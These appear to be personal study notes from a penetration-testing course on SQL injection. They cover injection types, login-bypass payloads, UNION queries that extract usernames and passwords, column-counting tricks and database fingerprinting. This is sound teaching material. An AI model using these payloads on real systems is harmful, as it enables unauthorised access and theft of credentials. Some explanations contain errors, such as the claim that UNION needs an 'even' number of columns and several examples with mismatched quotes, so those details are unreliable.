# Definition
Occures when user-input is used in a SQL query string without properly santizing or filtering the input

## Example
Consider the following PHP
```php
$searchInput =  $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);
```

Anything entered into `%searchInput` becomes the search, and the resulting sql query will look something like:
```sql
select * from logins where username like `%$testinput`
```

If we try and add some sql code in the search field, it just becomes the search term, for example if we enter `SHOW DATABASES;` in the search field, we get the resulting SQL:
```sql
select * from logins where username like `%SHOW DATABASES;`
```

Obviously this will return few results.

In this particular example, since there's no sanitization in place, we can terminate the sql statement and append a new one, by simply using a `'`

For example, we can enter `1'; SHOW DATABASES;'

Resulting in the following SQL query:
```sql
select * from logins where username like '%1'; SHOW DATABASES;'
```

and Waalaa, we have an injection

# Types of SQL Injections
 Based on how and where we retrieve their output.
 ![types of injections](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/33/types_of_sqli.jpg)

## Definitions
* In-Band - Output of both the intended and the new query printed directly on the front-end and can be directly read.  
    ** Union Based - have to specify the exact location (such as a column), which we can read, so the query will direct the output there.  
    ** Error Based - Used when we can see SQL errors on the front end, so we intentionally cause an error that returns the output we need.  
* Blind - Output not printed and must be retrieved, character by character.  
    ** Boolean Based - Use SQL conditional statements to control whether the page returns any output at all if our conditional statement returns true  
    ** Time Based - Use SQL conditional statements to delay the page response if the conditional statement returns true using the `Sleep()` function  
* Out-of-band - No access to the output whatsoever. Must use a proxy to read the data. i.e., DNS Record  
    **  

# Query Logic Subversion
## Auth Bypass
In auth bypass, the trick is the `WHERE` conditions interaction with `AND` and `OR`. With the `AND` condition both statements must be true, but with the `OR` condition, only one statement needs to be true.

Consider a type unsanitized query for authentication
```sql
SELECT * FROM logins WHERE username='admin' AND password='password';
```

This query uses the `AND` operator to match the given username and password. If the DB returns matched records, the credentials are valid, and would evaluate to `true`, if we were to submit the wrong password, the `AND` operator would evaluate to false, and the login would fail.
> This is all about getting the webpage to evaluate the login credentials as `true`

## SQLi Discovery
To verify if the page is even vulnerable to injection, try inserting one of the below characters and see if the page changes.
|Payload|URL Encoded|
|-------|-----------|
|`'`|`%27`|
|`"`|`%22`|
|`#`|`%23`|
|`;`|`%3b`|
|`)`|`%29`|
> Note: Sometimes we'll need to use the url encoded form.

In our example above, injecting a single quote throws a syntax error, because we have an odd number of quotes in our query.

## `OR` Injection
* Most Important: We always need the query to return `true`, regardless of the username and password entered
* Critical to this, is the MySQL Operation Precedenct, which states an `AND` is always evaluated before an `OR`. This means that if there is at least one `true` condition along with an `OR` operator, the condition will evaluate to true.

Our original query:
```sql
SELECT * FROM logins WHERE username='admin' AND password='password';
```

If we can modifiy our query to contain at lease one `true` statement and an `OR` operator, we can bypass the auth.

True statement: `'1' = '1'`

So let's modify our query:
```sql
SELECT * FROM logins WHERE username='admin or '1'='1'' AND password='something';
```
:warning: The above query fails with a syntax error, because too many quotes.

So our username entry needs to look like `admin or '1'='1` to preserve the original quotes, resulting in:
```sql
SELECT * FROM logins WHERE username='admin or '1'=1' AND password='something';
```
Query in plain english:
* if username is `admin` `OR` if `1=1` return `true` `AND` if password is `something`

Why this works:
`AND` is evaluated first:
* `'1'='1'` is `TRUE`
* `PASSWORD='something'` is `FALSE`
* The result of the `AND` condition is `FALSE` because `true AND false` is `False`

Next, the `OR` is evaulated:
* If `username='admin'` exists, the entire query returns true
* `'1'='1'` condition is irrelevant in this example because we just needed to get the `OR` in there.
> we just need at least part of the `OR` to evaulate to `True`

## Using Comments
2 Types of comments available to use:
* `-- `
> Note: the 2 dashes `-- ` is not enough to start a comment. You have to have a space after it. This might be url encoded as `--+`. You may also see this as `-- -` (3 dashes with a space between the 2nd and 3rd dash.  

* `#`
> Note: The `#` cannot be passed in the url of a browser, it will need to be url encoded as `%23`

We want our query to look something like this:
```sql
SELECT * FROM logins WHERE username='admin'-- ' AND password='something';
```
As you can see in the syntax highlighting, the rest of the query was commented out, so as long as the username is correct, the `WHERE` will return to `TRUE`

## Parenthetical Evalation
Consider the following SQL froma  login form:
```sql
SELECT * FROM logins WHERE (username=input AND id >1) AND password=input
```
>Note: This is a common way to prevent an admin from logging in, as the id must be greater than 1.

We can bypass this by commenting out and closing the parenthesis

Example 1:  
Username input: `admin')-- -`  
password input: test  
Results in the following query:
```sql
SELECT * FROM logins WHERE (username='admin')-- AND id>1) AND password=test
```
This get's us in because we closed out the parenthisis right after the username and then commented out the rest of the statement.  

Example 2: In this example, we do not know the username, but we are going to use the `id` column to log in as anyone we want.  
Username input: `test' OR id=5)-- `  
Password input: test  
Results in the following query:
```sql
SELECT * FROM logins WHERE (username='test' OR id=5)-- AND password=test
```
This get's us in because we changed the parenthetical `AND` into an `OR` and just entered an arbitrary ID, then commented out the rest of the query.

## Additional Resources
[Infosec Mastery](https://www.youtube.com/watch?v=zEWQD4OwGZs)  

# Union Clause
## Definition
The Union clause is used to combine results from multiple `SELECT` statements

Example:
```sql
# From the ports table
mysql> SELECT * FROM ports;

+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| ZZ-21    | Shenzhen  |
+----------+-----------+
3 rows in set (0.00 sec)

# From the ships table
mysql> SELECT * FROM ships;

+----------+-----------+
| Ship     | city      |
+----------+-----------+
| Morrison | New York  |
+----------+-----------+
1 rows in set (0.00 sec)

# From Both using a UNION
sql> SELECT * FROM ports UNION SELECT * FROM ships;

+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| Morrison | New York  |
| ZZ-21    | Shenzhen  |
+----------+-----------+
4 rows in set (0.00 sec)
```

## Even Columns
`UNION` statements can only work on `SELECT` statements with an even number of columns. If ports has 2 columns, ships must have 2 columns, else you'll throw an error.

Example: This fails because we're only selecting one column and our `UNION` returns 2 columns
```sql
mysql> SELECT city FROM ports UNION SELECT * FROM ships;

ERROR 1222 (21000): The used SELECT statements have a different number of columns
```

Example: This works if the products table has 2 columns.
```sql
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```

Example: If the products table has 3 columns, we could just select 2 columsn and it would work.
```sql
SELECT product_id, description from products where product_id = '1' UNION SELECT username, password from passwords-- '
```
## Uneven columns
Normally, we won't be so lucky that our tables have a matching number of columns

Solution: Fill your query with junk data.

Take our `products` table above that has 3 columns, filling with junk data might look something like this.
```sql
SELECT * FROM products where product_id = '1' UNION SELECT username, password, 3 from password-- '
```
:warning: Your junk data must fit the same datatype as the column you're trying to fill. The easiest way around this, is to just use `NULL`, as `NULL` fits all data types.

## Detecting the Number of Columns
### `ORDER BY`
We can use the `ORDER BY` function until we generate an error. 
For Example on a table with 4 columns:
```sql
order by 3--
# Get's us results
```
and then:
```sql
order by 4-- 
# Get's us results
```

and then:
```sql
order by 5--
# Get's us an error
```
Now we know the table has 4 columns

### `UNION`
When using `ORDER BY`, we get results until we hit an error, with `UNION` we get an error until we get results

Example of a table with 4 columns:
```sql
cn' UNION select 1,2,3--
# This will generate an error
```
```sql
cn' UNION select 1,2,3,4-- 
# This gets us results, so we know we have 4 columns
```
## Location of Injection
Query's may return multiple columns, but not all of the columns may be displayed. We have to make sure we inject our query into a column that is printed to the page.
> :Note: this is a benefit of using numbers if possible to identify the columns

We can use the `@@version` command to identify displayed columns
Example: A Table with 4 columsn
```sql
cn' UNION select 1,@@version,3,4-- -
# Displays the version in the 2nd column
```
By cycling the `@@version` function into the columns, we can determine which columns are displayed.

# Database Enumeration
## MySQL Fingerprinting
We first need to identify the DBMS we are up against. If the HTTP responses indicate a linux webserver, there's a pretty good bet we're dealing with MySQL. If they indicate IIS, there's a pretty good chance we're dealing with MSSQL. These could be wrong though, but it makes a good starting point.

We can use the following queries to determine if the DB is MySQL:
|Payload|When to Use|Expected Output|Wrong Output|
|-------|-----------|---------------|------------|
|`Select @@Version`|When we have full query Output|MySQL Version 'ie. `10.3..22-MariaDB-1ubuntu1`'|In MSSQL, it returns MSSQL version. Errors with other DBMS|
|`SELECT POWER(1,1)`|When we only have numeric output|`1`|Error with all other DBMS|
|`SELECT SLEEP(5)`|Blind/No Output|Delays page response for 5 seconds and returns `0`|Will not delay response with other DBMS|

